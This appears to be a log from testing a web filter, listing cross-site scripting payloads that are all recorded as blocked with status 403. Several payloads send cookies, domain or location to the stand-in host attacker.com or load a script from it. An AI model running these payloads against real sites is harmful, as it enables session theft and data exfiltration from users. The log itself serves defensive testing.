+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00290936601231806}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030298350029625}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00277800700860098}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027905169990845025}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029380390042206272}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003003450998221524}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031055299914442003}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002859335989342071}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002802578004775569}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031519100011792034}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005063243006588891}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004002342000603676}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004107474989723414}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004052593998494558}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003768794995266944}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003503635001834482}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031382239976665005}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030124550103209913}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003360039001563564}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002938569989055395}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00273550400743261}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027744480030378327}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031109650008147582}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034445530036464334}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003075403001275845}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002906000998336822}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002753811000729911}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0054908439924474806}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003961089998483658}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033042330032913014}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032334909919882193}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0047093009925447404}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0043556450109463185}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035462579980958253}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034512150014052168}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007320332006202079}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0053899019985692576}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005437512998469174}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005757902996265329}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005045144003815949}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004700367004261352}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00438184299855493}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039641619950998574}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035915750049753115}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003300805008620955}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034143740049330518}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036745739926118404}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004548192999209277}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0039399759989464656}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003208091002306901}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00336692800919991}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029573659994639456}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003256821000832133}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031682449916843325}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032052979950094596}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033453409996582195}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031758049881318584}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004316609993111342}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005733762009185739}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004403644998092204}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004283946007490158}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0040166609978768975}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004119970006286167}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034052749979309738}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00425616699794773}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003706752002472058}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032948040025075898}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031588129932060838}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003559723001671955}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030065329920034856}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029137569945305586}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.002883894005208276}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028380570001900196}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034860909945564345}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033705410023685545}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030850350012769923}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0029743829945800826}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027277750050416216}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003390255995327607}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031322119903052226}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0030001870036358014}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028940639895154163}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0027131960086990148}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028762900037690997}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004601574997650459}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005290270011755638}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004161055010627024}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006901511995238252}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0053278319974197075}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005525657994439825}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0054856810020282865}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005061820993432775}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005050349005614407}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004525929005467333}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004934005992254242}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0046047930081840605}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004860264001763426}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006041073007509112}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004919277998851612}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005972496001049876}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005403622999438085}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005428695993032306}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006154151997179724}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004723560996353626}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0047198440006468445}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006303428002865985}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007040073003736325}
+{"payload": "<script src=\"https://attacker.com/xss.js\"></script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00505839500692673}
+{"payload": "<img src=\"x\" onerror=\"fetch('https://attacker.com?c='+document.cookie)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00700400400091894}
+{"payload": "<svg onload=\"fetch('https://attacker.com?d='+document.domain)\"></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.007030556007521227}
+{"payload": "<body onload=\"fetch('https://attacker.com?l='+location)\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006112256000051275}
+{"payload": "<input value=\"<img src=x onerror=alert(1)>\">", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0062476190068991855}
+{"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005019365999032743}
+{"payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005368219004594721}
+{"payload": "<a href=\"javascript:alert(1)\">Click me</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006328256000415422}
+{"payload": "<svg><script>alert(1)</script></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005423025999334641}
+{"payload": "<svg onload=alert(document.cookie)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006467532002716325}
+{"payload": "<img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005149951000930741}
+{"payload": "\"><script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003927661004127003}
+{"payload": "<script>alert(1)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004543204995570704}
+{"payload": "<details open ontoggle=alert(1)></details>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005671021994203329}
+{"payload": "<div onpointerenter=alert(1)>Hover me</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006343885994283482}
+{"payload": "<button onclick=\"alert(1)\">Click</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006034300007740967}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004550648009171709}
+{"payload": "<marquee onstart=alert(1)>XSS</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0041041400108952075}
+{"payload": "<a href=\"javascript:alert(document.cookie)\">Click</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034498110035201535}
+{"payload": "\"><img src=x onerror=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004474257002584636}
+{"payload": "<svg><g onload=alert(1)></g></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003245964995585382}
+{"payload": "<x onmouseover=alert(1)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028804409957956523}
+{"payload": "<iframe src=javascript:alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031167380075203255}
+{"payload": "<svg onload=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033429670002078637}
+{"payload": "<script>alert('XSS')</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036355089978314936}
+{"payload": "\"><script>alert(document.cookie)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033990139927482232}
+{"payload": "<x onmouseover=alert(document.domain)>Hover</x>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003058640009840019}
+{"payload": "<img src=x onerror=alert(location)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0028645759884966537}
+{"payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0031823680037632585}
+{"payload": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003920297007425688}
+{"payload": "<script>fetch('https://attacker.com?d='+document.domain)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003511800998239778}
+{"payload": "<iframe src=\"https://attacker.com?c=\"+document.cookie></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003089459001785144}
+{"payload": "<body onload=fetch('https://attacker.com?l='+location)></body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003018292991328053}
+{"payload": "\"><img src=x onerror=alert('XSS')>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003913092004950158}
